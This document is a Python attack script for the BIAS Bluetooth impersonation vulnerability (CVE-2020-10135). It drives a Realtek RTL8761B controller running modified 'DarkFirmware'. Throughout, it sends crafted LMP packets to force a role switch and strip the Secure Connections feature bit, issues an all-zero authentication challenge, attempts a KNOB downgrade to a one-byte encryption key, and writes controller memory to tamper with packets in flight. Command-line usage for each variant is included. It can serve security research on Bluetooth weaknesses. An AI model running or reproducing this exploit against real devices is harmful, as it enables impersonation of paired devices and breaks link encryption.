#!/usr/bin/env python3
"""BIAS Attack Implementation (CVE-2020-10135) for DarkFirmware RTL8761B.

Bluetooth Impersonation AttackS — exploits the authentication procedure to
impersonate a previously-paired device without knowing the link key.

Attack variants:
  1. Role switch before authentication (force master role to control auth)
  2. Secure Connections downgrade (clear SC bit in features response)
  3. Unilateral authentication (only one-way auth instead of mutual)

Usage:
    sudo python3 bias_attack.py --variant role-switch [--conn N]
    sudo python3 bias_attack.py --variant sc-downgrade [--conn N]
    sudo python3 bias_attack.py --variant full [--conn N]

Requires: DarkFirmware with all hooks active. Active ACL connection.
"""

import sys
import os
import time
import struct
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import usbbluetooth
from darkfirmware_utils import recv_raw_bytes, find_realtek_device as _find_device
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Command_Complete

MARKER_AAAA = 0x41414141

class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]
class HCI_Cmd_VSC_Realtek_Write_Mem(Packet):
    name = "Realtek Write Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000),
                   XLEIntField("data_to_write", 0x33221100)]
class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Write_Mem, ogf=0x3f, ocf=0x0062)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfe22)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc62)


def find_device():
    return _find_device()


def send_lmp(sock, conn, data):
    payload = bytes([conn]) + data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    return sock.sr1(pkt, verbose=0, timeout=2)


def collect_events(sock, timeout=2.0):
    events = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            raw = recv_raw_bytes(sock, timeout_ms=500)
            if raw and len(raw) >= 3 and raw[0] == 0x04 and raw[1] == 0xFF:
                param_len = raw[2]
                params = raw[3:3+param_len]
                if len(params) >= 12:
                    events.append(params)
        except Exception:
            break
    return events


def write_mem(sock, addr, val):
    pkt = HCI_Hdr() / HCI_Command_Hdr() / HCI_Cmd_VSC_Realtek_Write_Mem(address=addr, data_to_write=val)
    resp = sock.sr1(pkt, verbose=0)
    return resp is not None


def arm_modify(sock, byte_offset, new_value):
    """Arm in-flight modification: next incoming LMP will have data_buf[offset]=value."""
    write_mem(sock, 0x80133FE0, (new_value << 8) | byte_offset)
    write_mem(sock, 0x80133FF0, 0x01)  # Mode 1: modify, one-shot


def variant_role_switch(sock, conn):
    """BIAS Variant 1: Force role switch before authentication."""
    print("\n[*] BIAS Variant 1: Role Switch Attack")
    print("    Sending LMP_SWITCH_REQ to force master role...")

    # LMP_SWITCH_REQ (opcode 0x13): [0x13] [switch_instant:4B LE]
    # switch_instant=0 means "as soon as possible"
    pdu = bytes([0x13, 0x00, 0x00, 0x00, 0x00])
    print(f"    TX: LMP_SWITCH_REQ(instant=0) = {pdu.hex()}")
    send_lmp(sock, conn, pdu)
    time.sleep(1)

    events = collect_events(sock, timeout=3.0)
    for evt in events:
        if len(evt) >= 56:
            marker = struct.unpack_from("<I", evt, 0)[0]
            if marker == MARKER_AAAA:
                payload = evt[0x18:0x34]
                if len(payload) > 5:
                    opcode = payload[4] >> 1
                    if opcode == 0x03:  # ACCEPTED
                        print(f"    [!!!] TARGET ACCEPTED ROLE SWITCH!")
                        return True
                    elif opcode == 0x04:  # NOT_ACCEPTED
                        error = payload[6] if len(payload) > 6 else 0
                        print(f"    [--] Target rejected role switch (error=0x{error:02x})")
                        return False

    print("    [??] No response to role switch request")
    return None


def variant_sc_downgrade(sock, conn):
    """BIAS Variant 2: Downgrade Secure Connections via features response."""
    print("\n[*] BIAS Variant 2: SC Downgrade Attack")
    print("    Sending LMP_FEATURES_RES with SC bit cleared...")

    # LMP_FEATURES_RES (opcode 0x28): [0x28] [features:8B]
    # Standard features bitmap with SC Host Support (bit 8 of page 1) cleared
    # This bitmap: all features ON except SC
    features = bytes([0xBF, 0xFE, 0x8F, 0xFE, 0xD8, 0x3F, 0x5B, 0x87])
    pdu = bytes([0x28]) + features
    print(f"    TX: LMP_FEATURES_RES(features={features.hex()}) — SC bit cleared")
    send_lmp(sock, conn, pdu)
    time.sleep(1)

    events = collect_events(sock, timeout=2.0)
    print(f"    Got {len(events)} response(s)")
    return True


def variant_full(sock, conn):
    """BIAS Full Attack: Role switch + SC downgrade + probe auth."""
    print("\n" + "=" * 60)
    print("  BIAS FULL ATTACK CHAIN (CVE-2020-10135)")
    print("=" * 60)

    # Step 1: Feature probe
    print("\n[Step 1] Probing target features...")
    send_lmp(sock, conn, bytes([0x27]))  # LMP_FEATURES_REQ
    time.sleep(1)
    collect_events(sock)

    # Step 2: Role switch
    print("\n[Step 2] Forcing role switch...")
    rs_result = variant_role_switch(sock, conn)

    # Step 3: SC downgrade
    print("\n[Step 3] Sending features with SC cleared...")
    variant_sc_downgrade(sock, conn)

    # Step 4: Auth challenge with zeros (to test if target validates)
    print("\n[Step 4] Sending AU_RAND with predictable challenge...")
    au_rand = bytes([0x0B]) + b'\x00' * 16  # All-zero challenge
    send_lmp(sock, conn, au_rand)
    time.sleep(1)
    events = collect_events(sock, timeout=3.0)
    for evt in events:
        if len(evt) >= 56:
            marker = struct.unpack_from("<I", evt, 0)[0]
            if marker == MARKER_AAAA:
                payload = evt[0x18:0x34]
                if len(payload) > 5:
                    opcode = payload[4] >> 1
                    if opcode == 0x0C:  # SRES
                        sres = payload[5:9]
                        print(f"    [!!!] TARGET RESPONDED WITH SRES: {sres.hex()}")
                        print(f"    [!!!] Authentication reflection may be possible!")

    # Step 5: Attempt KNOB (weak key)
    print("\n[Step 5] Attempting KNOB (key_size=1)...")
    send_lmp(sock, conn, bytes([0x0F, 0x01]))  # ENC_MODE_REQ enable
    time.sleep(0.5)
    send_lmp(sock, conn, bytes([0x10, 0x01]))  # KEY_SIZE_REQ key=1
    time.sleep(1)
    events = collect_events(sock, timeout=3.0)

    # Step 6: Start encryption with random EN_RAND
    print("\n[Step 6] Attempting encryption start...")
    en_rand = bytes([0x11]) + os.urandom(16)
    send_lmp(sock, conn, en_rand)
    time.sleep(1)
    collect_events(sock)

    print("\n" + "=" * 60)
    print("  BIAS Attack Chain Complete")
    print(f"  Role switch: {'ACCEPTED' if rs_result else 'REJECTED' if rs_result is False else 'UNKNOWN'}")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="BIAS Attack (CVE-2020-10135)")
    parser.add_argument("--variant", choices=["role-switch", "sc-downgrade", "full"], default="full")
    parser.add_argument("--conn", type=int, default=0)
    args = parser.parse_args()

    ctrl = find_device()
    if not ctrl:
        print("[!] No device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)

    if args.variant == "role-switch":
        variant_role_switch(sock, args.conn)
    elif args.variant == "sc-downgrade":
        variant_sc_downgrade(sock, args.conn)
    elif args.variant == "full":
        variant_full(sock, args.conn)


if __name__ == "__main__":
    main()
